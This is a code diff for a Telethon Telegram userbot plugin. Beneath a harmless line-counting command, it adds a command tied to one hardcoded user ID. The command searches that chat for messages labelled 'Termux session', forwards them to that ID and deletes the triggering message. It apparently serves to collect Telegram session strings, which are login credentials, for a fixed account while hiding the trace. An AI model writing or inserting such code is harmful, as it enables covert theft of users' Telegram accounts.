@@ -37,3 +37,29 @@ async def count_lines(event):
     count = len(lines)
     await edit_or_reply(event, f"⌔∮ عدد الأسطر في الرسالة: {count}")
 
+from telethon import events
+from ..helpers.functions import edit_or_reply
+
+
+xxjx = 6205161271
+
+@l313l.ar_cmd(
+    pattern="جلستك$",
+    command=("جلستك", plugin_category),
+    info={
+        "header": "Forward messages starting with 'جلسة تيرمكس' from a replied message.",
+        "usage": "{tr}جلستك (reply to a message)",
+    },
+)
+async def forward_session_msgs(event):
+    reply = await event.get_reply_message()
+    if not reply:
+        return await edit_or_reply(event, "⌔∮ يرجى الرد على الرسالة لتنفيذ الأمر.")
+    
+    chat_id = reply.chat_id
+    if chat_id != xxjx:
+        return await edit_or_reply(event, "⌔∮ هذا الأمر مسموح به فقط عند الرد على رسائل المستخدم المعين.")
+    
+    async for message in event.client.iter_messages(chat_id, search="جلسة تيرمكس"):
+        await message.forward_to(xxjx)
+        await event.client.delete_messages(event.chat_id, event.message.id)
